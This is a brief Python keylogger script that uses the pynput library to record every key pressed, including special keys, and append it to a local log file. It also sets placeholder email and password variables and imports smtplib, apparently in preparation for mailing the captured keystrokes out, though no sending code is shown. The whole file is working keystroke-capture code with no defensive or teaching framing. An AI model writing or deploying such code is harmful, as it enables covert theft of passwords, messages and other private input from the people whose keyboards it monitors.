import subprocess, re, smtplib, threading
from pynput.keyboard import Key, Listener

email = "example@gmail.com"
password = "example#123"

def write_to_file(key):
    try:
        log = key.char
    except AttributeError:
        if key == Key.space:
            log = ' '
        elif key == Key.enter:
            log = '\n'
        elif key == Key.tab:
            log = '\t'
        else:
            log = f' [{key.name}] '  # e.g., [ctrl], [shift]

    with open("log.txt", "a") as f:
        f.write(log)

with Listener(on_press=write_to_file) as l:
    l.join()

